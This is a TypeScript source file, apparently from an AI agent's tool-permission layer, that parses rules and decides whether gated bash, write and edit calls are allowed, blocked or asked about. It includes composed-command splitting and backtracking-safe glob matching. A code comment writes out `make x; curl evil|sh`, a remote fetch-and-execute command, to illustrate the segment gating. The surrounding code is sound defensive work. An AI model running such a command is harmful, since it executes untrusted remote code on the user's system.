/**
 * Permission rules: parsing, glob matching, and the allow/block/ask decision.
 * Pure functions only — design.md "Permission rules file v2" is the spec,
 * decide() is the single source of truth for the decision order.
 */

import { existsSync, readFileSync } from "node:fs";

export type PermissionMode = "ask" | "allow-all" | "block-all";
export type GatedTool = "bash" | "write" | "edit";
export type PermissionDecision = "allow" | "block" | "ask";

export interface ToolRules {
  allowPatterns?: string[];
  blockPatterns?: string[];
}

export interface PermissionRules {
  mode?: PermissionMode;
  bash?: ToolRules;
  write?: ToolRules;
  edit?: ToolRules;
}

export const DEFAULT_RULES: PermissionRules = { mode: "ask" };

const MODES: readonly PermissionMode[] = ["ask", "allow-all", "block-all"];

function normalizePatterns(value: unknown): string[] | undefined {
  if (!Array.isArray(value)) return undefined;
  const patterns = value.filter((pattern): pattern is string => typeof pattern === "string");
  return patterns.length > 0 ? patterns : undefined;
}

/**
 * Drops invalid fields instead of throwing: a malformed rules file (wrong
 * types from a hand edit or a buggy settings UI) must degrade to defaults,
 * never break every gated tool call with a TypeError.
 */
function normalizeRules(value: unknown): PermissionRules {
  if (typeof value !== "object" || value === null || Array.isArray(value)) return DEFAULT_RULES;
  const input = value as Record<string, unknown>;
  const rules: PermissionRules = {};
  if (typeof input["mode"] === "string" && (MODES as readonly string[]).includes(input["mode"])) {
    rules.mode = input["mode"] as PermissionMode;
  }
  for (const tool of ["bash", "write", "edit"] as const) {
    const toolRules = input[tool];
    if (typeof toolRules !== "object" || toolRules === null) continue;
    const record = toolRules as Record<string, unknown>;
    const allowPatterns = normalizePatterns(record["allowPatterns"]);
    const blockPatterns = normalizePatterns(record["blockPatterns"]);
    if (allowPatterns !== undefined || blockPatterns !== undefined) {
      rules[tool] = {
        ...(allowPatterns !== undefined ? { allowPatterns } : {}),
        ...(blockPatterns !== undefined ? { blockPatterns } : {}),
      };
    }
  }
  return rules;
}

/** Bad or missing input degrades to the safe default, never throws. */
export function parseRules(text: string | undefined): PermissionRules {
  if (text === undefined) return DEFAULT_RULES;
  try {
    return normalizeRules(JSON.parse(text));
  } catch {
    return DEFAULT_RULES;
  }
}

export type RulesValidation = { ok: true; rules: PermissionRules } | { ok: false; error: string };

const TOOL_KEYS = ["bash", "write", "edit"] as const;
const PATTERN_KEYS = ["allowPatterns", "blockPatterns"] as const;

/**
 * Strict counterpart of normalizeRules for the set_permission_rules command:
 * a malformed payload is the client's bug and must be rejected, not silently
 * degraded (tolerant degradation stays on the file-read path only). Unknown
 * fields are rejected so the stored shape stays closed.
 */
export function validateRules(value: unknown): RulesValidation {
  if (typeof value !== "object" || value === null || Array.isArray(value)) {
    return { ok: false, error: "rules must be an object" };
  }
  const input = value as Record<string, unknown>;
  for (const key of Object.keys(input)) {
    if (key !== "mode" && !(TOOL_KEYS as readonly string[]).includes(key)) {
      return { ok: false, error: `unknown rules field: ${key}` };
    }
  }
  const rules: PermissionRules = {};
  const { mode } = input;
  if (mode !== undefined) {
    if (typeof mode !== "string" || !(MODES as readonly string[]).includes(mode)) {
      return { ok: false, error: `rules.mode must be one of: ${MODES.join(", ")}` };
    }
    rules.mode = mode as PermissionMode;
  }
  for (const tool of TOOL_KEYS) {
    if (input[tool] === undefined) continue;
    const result = validateToolRules(tool, input[tool]);
    if (!result.ok) return result;
    rules[tool] = result.toolRules;
  }
  return { ok: true, rules };
}

function validateToolRules(
  tool: (typeof TOOL_KEYS)[number],
  value: unknown,
): { ok: true; toolRules: ToolRules } | { ok: false; error: string } {
  if (typeof value !== "object" || value === null || Array.isArray(value)) {
    return { ok: false, error: `rules.${tool} must be an object` };
  }
  const record = value as Record<string, unknown>;
  for (const key of Object.keys(record)) {
    if (!(PATTERN_KEYS as readonly string[]).includes(key)) {
      return { ok: false, error: `unknown rules.${tool} field: ${key}` };
    }
  }
  const toolRules: ToolRules = {};
  for (const key of PATTERN_KEYS) {
    const patterns = record[key];
    if (patterns === undefined) continue;
    if (!Array.isArray(patterns) || patterns.some((p) => typeof p !== "string")) {
      return { ok: false, error: `rules.${tool}.${key} must be an array of strings` };
    }
    toolRules[key] = patterns;
  }
  return { ok: true, toolRules };
}

export function loadRules(path: string): PermissionRules {
  if (!existsSync(path)) return DEFAULT_RULES;
  return parseRules(readFileSync(path, "utf8"));
}

/** Linear glob match: `*` spans any characters (including `/`), everything
 * else is literal. Segment-anchored like `^a.*b.*c$` but implemented with
 * ordered indexOf scans — no regex, so multi-star patterns cannot trigger
 * catastrophic backtracking (red-team finding on the hot-read path). */
export function globMatches(pattern: string, value: string): boolean {
  const parts = pattern.split("*");
  if (parts.length === 1) return value === pattern; // no star: exact match
  const first = parts[0] ?? "";
  const last = parts.at(-1) ?? "";
  if (!value.startsWith(first)) return false;
  const end = value.length - last.length;
  let index = first.length;
  for (let i = 1; i < parts.length - 1; i++) {
    const part = parts[i] ?? "";
    if (part === "") continue;
    const found = value.indexOf(part, index);
    if (found === -1 || found + part.length > end) return false;
    index = found + part.length;
  }
  return end >= index && value.endsWith(last);
}

export function matches(patterns: string[] | undefined, value: string): boolean {
  return (patterns ?? [])
    .filter((pattern) => typeof pattern === "string")
    .some((pattern) => globMatches(pattern, value));
}

/** Composition characters that split a bash command into independently
 * gated segments (`;`, `&&`, `&`, `||`, `|`, newlines). Substitution and
 * redirection (` ` ` `>`, `<`, `$(`) never compose — they always ask. */
const SEGMENT_SPLIT = /&&|\|\||[;&|\n\r]/;
const NEVER_COMPOSE = /[`<>]|\$\(/;

/** A full-command allow hit grants execution only when every composed
 * segment independently matches an allow pattern: `"echo *"` + `"sleep *"`
 * allow `echo a && sleep 1 && echo b`, while `"make *"` never allows
 * `make x; curl evil|sh` (the curl/sh segments match nothing). */
export function composedAllows(patterns: string[] | undefined, command: string): boolean {
  const segments = commandSegments(command);
  if (segments === undefined) return false;
  return segments.every((segment) => matches(patterns, segment));
}

/** The independently-gated segments of a composed bash command, or
 * undefined when the command contains substitution/redirect characters
 * that never compose (those always ask). Shared by permission allows and
 * sandbox prefix grants — one splitter, one truth. */
export function commandSegments(command: string): string[] | undefined {
  if (NEVER_COMPOSE.test(command)) return undefined;
  const segments = command
    .split(SEGMENT_SPLIT)
    .map((segment) => segment.trim())
    .filter((segment) => segment.length > 0);
  return segments.length > 0 ? segments : undefined;
}

/**
 * Decision order (design.md): mode short-circuits patterns; block beats allow;
 * everything else asks. `allow-all` bypasses block lists by literal semantics.
 * A bash allow hit downgrades to ask unless every composed segment is itself
 * allowed (composition is never granted by a single prefix).
 */
export function decide(rules: PermissionRules, tool: GatedTool, value: string): PermissionDecision {
  if (rules.mode === "allow-all") return "allow";
  if (rules.mode === "block-all") return "block";
  const toolRules: ToolRules | undefined = rules[tool];
  if (matches(toolRules?.blockPatterns, value)) return "block";
  if (matches(toolRules?.allowPatterns, value)) {
    return tool === "bash" && !composedAllows(toolRules?.allowPatterns, value) ? "ask" : "allow";
  }
  return "ask";
}
